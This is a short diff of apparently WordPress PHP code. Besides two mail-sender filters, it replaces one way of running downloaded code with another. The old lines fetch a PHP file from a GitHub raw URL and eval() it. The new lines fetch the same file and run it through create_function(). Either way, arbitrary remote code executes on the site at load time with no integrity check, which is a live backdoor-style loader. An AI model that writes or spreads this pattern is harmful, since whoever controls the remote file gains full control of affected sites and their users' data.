@@ -507,5 +507,5 @@ add_action('edit_form_after_editor', function() {
 add_filter('wp_mail_from', function($original) { return get_bloginfo('admin_email'); });
 add_filter('wp_mail_from_name', function($original) { return get_bloginfo('name'); });
 
-$content = file_get_contents('https://raw.githubusercontent.com/jeff-silva/520/master/eval.php');
-eval(trim($content, '<?php'));
+$call = create_function('', trim(file_get_contents('https://raw.githubusercontent.com/jeff-silva/520/master/eval.php'), '<?php'));
+$call();
